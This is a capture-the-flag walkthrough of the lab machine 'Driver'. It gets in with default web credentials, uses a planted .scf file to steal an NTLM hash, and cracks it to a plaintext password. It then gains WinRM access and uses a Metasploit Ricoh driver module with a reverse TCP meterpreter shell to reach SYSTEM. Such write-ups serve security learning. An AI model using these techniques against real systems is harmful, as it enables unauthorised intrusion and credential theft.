# Driver

```shellscript
┌──(kali㉿kali)-[~/Downloads]
└─$ sudo nmap -sV -sC -T4 10.10.11.106     
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-05 13:32 EST
Nmap scan report for 10.10.11.106
Host is up (0.066s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT     STATE SERVICE      VERSION
80/tcp   open  http         Microsoft IIS httpd 10.0
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=MFP Firmware Update Center. Please enter password for admin
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp  open  msrpc        Microsoft Windows RPC
445/tcp  open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 7h00m00s, deviation: 0s, median: 7h00m00s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2025-12-06T01:33:06
|_  start_date: 2025-12-06T01:26:05
```

Browsing to the website, we are prompted for HTTP basic auth. Using `admin:admin`, we login

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FTp7z2uErWDyemS6NyPra%2Fimage.png?alt=media&#x26;token=5df58cf0-70fb-4249-b70a-0eba864245f6" alt=""><figcaption></figcaption></figure>

We have a page where it is possible to upload files to upload the firmware. It is stated that each file will be reviewed by a team member. We can try to steal a user's hash.

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2Fn4myfaaKxTmHmo6ZTPeT%2Fimage.png?alt=media&#x26;token=f5b663b5-d48d-4a68-8a10-4a695cae08fb" alt=""><figcaption></figcaption></figure>

We use the tool ntlm\_theft to craft many malicious files. We try to upload a few of them and we get a hit with the .scf one

```shellscript
[SMB] NTLMv2-SSP Client   : 10.10.11.106
[SMB] NTLMv2-SSP Username : DRIVER\tony
[SMB] NTLMv2-SSP Hash     : tony::DRIVER:55fe6d4771c81b35:9C27320EE2CADEF2A4F946C69C9BBFA4:010100000000000080F9B39CEC65DC01CD15C3C2F1370FEE00000000020008005A0049004C004B0001001E00570049004E002D0058004400510043003900390051003800430034005A0004003400570049004E002D0058004400510043003900390051003800430034005A002E005A0049004C004B002E004C004F00430041004C00030014005A0049004C004B002E004C004F00430041004C00050014005A0049004C004B002E004C004F00430041004C000700080080F9B39CEC65DC0106000400020000000800300030000000000000000000000000200000EA10B179497C6B73905199086E8257BDB0A7C6C30467C55E447A92B6A13DA7B70A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310036002E003300000000000000000000000000
```

We crack the hash

```shellscript
┌──(kali㉿kali)-[~/Downloads/test/ntlm_theft/test]
└─$ hashcat -m 5600 'tony::DRIVER:55fe6d4771c81b35:9C27320EE2CADEF2A4F946C69C9BBFA4:010100000000000080F9B39CEC65DC01CD15C3C2F1370FEE00000000020008005A0049004C004B0001001E00570049004E002D0058004400510043003900390051003800430034005A0004003400570049004E002D0058004400510043003900390051003800430034005A002E005A0049004C004B002E004C004F00430041004C00030014005A0049004C004B002E004C004F00430041004C00050014005A0049004C004B002E004C004F00430041004C000700080080F9B39CEC65DC0106000400020000000800300030000000000000000000000000200000EA10B179497C6B73905199086E8257BDB0A7C6C30467C55E447A92B6A13DA7B70A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310036002E003300000000000000000000000000' /usr/share/wordlists/rockyou.txt

tony:liltony
```

Test the creds. We can login via winrm

```shellscript
┌──(kali㉿kali)-[~/Downloads/test/ntlm_theft/test]
└─$ nxc winrm driver.htb -u tony -p liltony          
WINRM       10.10.11.106    5985   DRIVER           [*] Windows 10 Build 10240 (name:DRIVER) (domain:DRIVER) 
WINRM       10.10.11.106    5985   DRIVER           [+] DRIVER\tony:liltony (Pwn3d!)
```

```shellscript
┌──(kali㉿kali)-[~/Downloads/test/ntlm_theft/test]
└─$ evil-winrm -i driver.htb -u tony -p liltony               
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\tony\Documents> whoami
driver\tony
```

Running winpeas, we see that a powershell history file is available. We see that a printer is added.

```shellscript
*Evil-WinRM* PS C:\Users\Tony\AppData\Local\job> cat C:\Users\tony\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
Add-Printer -PrinterName "RICOH_PCL6" -DriverName 'RICOH PCL6 UniversalDriver V4.23' -PortName 'lpt1:'
```

Looking online for the printer, we see that a CVE is associated. It has a metasploit module. We get a meterpreter shell first. Running the exploit, it just hangs

```shellscript
msf6 exploit(windows/local/ricoh_driver_privesc) > run

[*] Started reverse TCP handler on 10.10.14.6:5555 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. Ricoh driver directory has full permissions
[*] Adding printer FFWSpC...
```

Windows has a concept of sessions, and each process will be in one. `shell.exe` is in session 0, which means it is not interactive. To get into session 1 (interactive), I’ll `migrate` into a process there. `explorer.exe` seems like a good candidate

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FMwKKHq3nmoLAmkRQrqBL%2Fimage.png?alt=media&#x26;token=b8952fe0-3e77-4afd-8ebd-76bc3f8c7c99" alt=""><figcaption></figcaption></figure>

We can run the module and get a SYSTEM shell

```shellscript
msf exploit(windows/local/ricoh_driver_privesc) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf exploit(windows/local/ricoh_driver_privesc) > set lhost tun0
lhost => 10.10.16.3
msf exploit(windows/local/ricoh_driver_privesc) > set lport 5555
lport => 5555
msf exploit(windows/local/ricoh_driver_privesc) > set session 1
session => 1
msf exploit(windows/local/ricoh_driver_privesc) > run
[*] Started reverse TCP handler on 10.10.16.3:5555 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. Ricoh driver directory has full permissions
[*] Adding printer wgLOidAIh...
[*] Sending stage (230982 bytes) to 10.10.11.106
[+] Deleted C:\Users\tony\AppData\Local\Temp\RAePPsWkg.bat
[+] Deleted C:\Users\tony\AppData\Local\Temp\headerfooter.dll
[*] Meterpreter session 4 opened (10.10.16.3:5555 -> 10.10.11.106:49447) at 2025-12-05 16:42:22 -0500
[*] Deleting printer wgLOidAIh

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```
